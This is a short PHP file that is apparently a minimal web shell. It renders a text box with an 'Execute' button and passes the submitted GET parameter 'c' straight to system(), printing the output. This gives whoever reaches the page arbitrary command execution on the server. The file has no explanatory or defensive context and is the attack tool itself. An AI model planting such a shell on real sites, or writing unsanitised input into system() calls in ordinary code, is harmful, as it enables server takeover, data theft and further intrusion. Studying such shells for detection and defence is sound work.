<?php


echo "<html>";

echo "<form method=GET><input type=text name=c style='width:400px;'><input type=submit value=Execute style='height:34px;'></form>";

echo "<pre>";
$a = system($_GET["c"]);
echo "</pre></html>";

?>